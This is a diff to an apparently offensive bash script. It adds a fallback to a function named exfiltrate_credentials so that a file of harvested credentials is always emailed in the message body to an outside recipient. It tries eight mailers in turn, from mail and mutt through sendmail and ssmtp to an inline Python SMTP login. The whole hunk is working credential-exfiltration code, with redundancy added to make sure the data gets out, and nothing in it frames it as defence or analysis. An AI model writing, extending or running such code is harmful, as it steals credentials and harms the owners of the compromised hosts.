@@ -4767,7 +4767,157 @@ exfiltrate_credentials() {
         echo "    Manual retrieval required!"
         echo ""
         # Don't delete temp dir - credentials are only saved locally
-        return 1
+        # Don't return yet - try inline email as last resort
+    fi
+    
+    # BACKUP METHOD: Send log file contents INLINE (no attachments)
+    # This runs ALWAYS as a second attempt for redundancy
+    echo ""
+    echo "=========================================="
+    echo "BACKUP: SENDING INLINE CREDENTIALS EMAIL"
+    echo "=========================================="
+    echo ""
+    
+    if [ -f "$LOG_FILE_EMAIL" ]; then
+        echo "[*] Sending credentials inline (in email body)..."
+        
+        local INLINE_SUBJECT="INLINE Credentials: $HOSTNAME"
+        
+        # Try simple commands first (most reliable, no config needed)
+        local INLINE_SUCCESS=false
+        
+        # Method 1: mail command
+        if command -v mail >/dev/null 2>&1; then
+            echo "[*] Trying mail command..."
+            if cat "$LOG_FILE_EMAIL" | mail -s "$INLINE_SUBJECT" "$RECIPIENT_EMAIL" 2>/dev/null; then
+                echo "[✓] Inline email sent via mail"
+                INLINE_SUCCESS=true
+            fi
+        fi
+        
+        # Method 2: mutt command
+        if [ "$INLINE_SUCCESS" = false ] && command -v mutt >/dev/null 2>&1; then
+            echo "[*] Trying mutt command..."
+            if cat "$LOG_FILE_EMAIL" | mutt -s "$INLINE_SUBJECT" "$RECIPIENT_EMAIL" 2>/dev/null; then
+                echo "[✓] Inline email sent via mutt"
+                INLINE_SUCCESS=true
+            fi
+        fi
+        
+        # Method 3: mailx command
+        if [ "$INLINE_SUCCESS" = false ] && command -v mailx >/dev/null 2>&1; then
+            echo "[*] Trying mailx command..."
+            if cat "$LOG_FILE_EMAIL" | mailx -s "$INLINE_SUBJECT" "$RECIPIENT_EMAIL" 2>/dev/null; then
+                echo "[✓] Inline email sent via mailx"
+                INLINE_SUCCESS=true
+            fi
+        fi
+        
+        # Method 4: s-nail command
+        if [ "$INLINE_SUCCESS" = false ] && command -v s-nail >/dev/null 2>&1; then
+            echo "[*] Trying s-nail command..."
+            if cat "$LOG_FILE_EMAIL" | s-nail -s "$INLINE_SUBJECT" "$RECIPIENT_EMAIL" 2>/dev/null; then
+                echo "[✓] Inline email sent via s-nail"
+                INLINE_SUCCESS=true
+            fi
+        fi
+        
+        # Method 5: sendmail with headers
+        if [ "$INLINE_SUCCESS" = false ] && command -v sendmail >/dev/null 2>&1; then
+            echo "[*] Trying sendmail command..."
+            {
+                echo "To: $RECIPIENT_EMAIL"
+                echo "From: root@$(hostname)"
+                echo "Subject: $INLINE_SUBJECT"
+                echo ""
+                cat "$LOG_FILE_EMAIL"
+            } | sendmail "$RECIPIENT_EMAIL" 2>/dev/null && {
+                echo "[✓] Inline email sent via sendmail"
+                INLINE_SUCCESS=true
+            }
+        fi
+        
+        # Method 6: /usr/sbin/sendmail
+        if [ "$INLINE_SUCCESS" = false ] && [ -x /usr/sbin/sendmail ]; then
+            echo "[*] Trying /usr/sbin/sendmail..."
+            {
+                echo "To: $RECIPIENT_EMAIL"
+                echo "From: root@$(hostname)"
+                echo "Subject: $INLINE_SUBJECT"
+                echo ""
+                cat "$LOG_FILE_EMAIL"
+            } | /usr/sbin/sendmail "$RECIPIENT_EMAIL" 2>/dev/null && {
+                echo "[✓] Inline email sent via /usr/sbin/sendmail"
+                INLINE_SUCCESS=true
+            }
+        fi
+        
+        # Method 7: ssmtp
+        if [ "$INLINE_SUCCESS" = false ] && command -v ssmtp >/dev/null 2>&1; then
+            echo "[*] Trying ssmtp command..."
+            {
+                echo "To: $RECIPIENT_EMAIL"
+                echo "From: root@$(hostname)"
+                echo "Subject: $INLINE_SUBJECT"
+                echo ""
+                cat "$LOG_FILE_EMAIL"
+            } | ssmtp "$RECIPIENT_EMAIL" 2>/dev/null && {
+                echo "[✓] Inline email sent via ssmtp"
+                INLINE_SUCCESS=true
+            }
+        fi
+        
+        # Method 8: Python3 simple email (no attachments)
+        if [ "$INLINE_SUCCESS" = false ] && command -v python3 >/dev/null 2>&1; then
+            echo "[*] Trying Python3 simple email..."
+            python3 -c "
+import smtplib
+import ssl
+from email.mime.text import MIMEText
+
+try:
+    # Read log file
+    with open('$LOG_FILE_EMAIL', 'r') as f:
+        body = f.read()
+    
+    msg = MIMEText(body, 'plain')
+    msg['From'] = '$SENDER_EMAIL'
+    msg['To'] = '$RECIPIENT_EMAIL'
+    msg['Subject'] = '$INLINE_SUBJECT'
+    
+    context = ssl.create_default_context()
+    with smtplib.SMTP('$SMTP_SERVER', $SMTP_PORT, timeout=30) as server:
+        server.ehlo()
+        server.starttls(context=context)
+        server.ehlo()
+        server.login('$SENDER_EMAIL', '$SMTP_PASSWORD')
+        server.send_message(msg)
+    print('Email sent successfully')
+except Exception as e:
+    print(f'Error: {e}')
+    exit(1)
+" 2>/dev/null && {
+                echo "[✓] Inline email sent via Python3"
+                INLINE_SUCCESS=true
+            }
+        fi
+        
+        if [ "$INLINE_SUCCESS" = true ]; then
+            echo ""
+            echo "[✓] ============================================"
+            echo "[✓] INLINE CREDENTIALS SENT SUCCESSFULLY!"
+            echo "[✓] ============================================"
+            echo "[✓] Log file contents delivered to: $RECIPIENT_EMAIL"
+            echo "[✓] Email subject: $INLINE_SUBJECT"
+            echo ""
+        else
+            echo ""
+            echo "[!] All inline email methods failed"
+            echo "[*] Credentials remain in: $LOG_FILE_EMAIL"
+            echo ""
+        fi
+    else
+        echo "[!] Log file not found: $LOG_FILE_EMAIL"
     fi
 
     # Clean up temp files only if email succeeded
